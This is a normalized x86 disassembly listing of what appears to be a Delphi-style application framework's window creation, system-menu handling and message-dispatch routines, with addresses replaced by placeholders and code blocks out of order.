mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4209c8
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46dc5c
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4289f8
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_428dc8
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_46e3f4
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c448
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46de54
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c470
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_4085c4
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_40415c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_46e5d0
mov eax ebx
call sub_46efe4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_46c88c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_46c76d
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_403528
mov ebx edx
mov esi eax
mov eax esi
call sub_46eff4
mov [ esp + 0x4 ] esi
mov [ esp ] sub_46dc5c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_46de54
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_46e7f0
xor edx edx
mov eax esi
call sub_46e16c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420a14
push esi
push sub_46ccc0
mov eax esi
call sub_46da48
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405758
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403174
mov eax [ esi + 0x90 ]
call sub_403174
mov eax [ esi + 0x98 ]
call sub_403174
test bl bl
jle r-xdata
call sub_421af0
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_46c88c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46ca2d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ca34
lea eax [ ebp - 0x2c ]
call sub_403eec
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_46ce0c
call sub_421a58
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_4043ac
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406b38
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403eec
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_46d510
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_46d510
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_46ca3c
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_46b770
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_46ca9c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_41814c
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_453e1c
cmp ebx eax
je r-xdata
sub_46cb0c
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_46ca9c
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4182a8
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_46cc24
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4182a8
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_46ccc0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c710
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_46bc7c
mov eax [ rw-data ]
call sub_46c2c4
sub_46cd18
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46cd75
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cd7c
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_4040e4
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_46cd84
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_46cdc0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46d510
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_46ce0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_46d4c6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46ccc0
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_46df2c
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_4182a8
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_453e1c
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46eea8
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_46da48
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_46d9ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_453e1c
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d510
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_46c2c4
push ebp
call sub_46cd84
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_46cd84
pop ecx
jmp [ eax * 4 + jump_table_46ceb0 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_453e1c
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46d8c4
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4587d8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46cd18
push ebp
call sub_46cd84
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_46cd84
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_46cd84
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_420828
jmp r-xdata
xor eax eax
call sub_464b10
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_453e1c
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_44e7e8
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d52c
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_46cd84
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_46a4c4
jmp r-xdata
push ebp
call sub_46cd84
pop ecx
jmp r-xdata
push ebp
call sub_46cdc0
pop ecx
jmp r-xdata
push ebp
call sub_46cd84
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_46cc24
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d5dc
jmp r-xdata
jmp r-xdata
call sub_43fdc4
call sub_43fea4
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_46cc14
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46cc24
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46cc1c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4649c0
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_46cd84
pop ecx
jmp r-xdata
call sub_464a74
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_46cd84
pop ecx
jmp r-xdata
call sub_43fdc4
call sub_43ff00
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d0b8
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_46d52c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_46cc14
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_46c544
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_453e1c
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_453e1c
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_46d5dc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_46c544
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_453e1c
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_46cc24
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_453e1c
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_468250
mov eax [ ebx + 0x44 ]
call sub_46a66c
sub_46d6dc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_46d718
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403f40
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_403fdc
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_46d764
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_46d788
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_46d7d8
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_44a514
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_453e1c
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_46d890
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_46e7f0
sub_46d8c4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
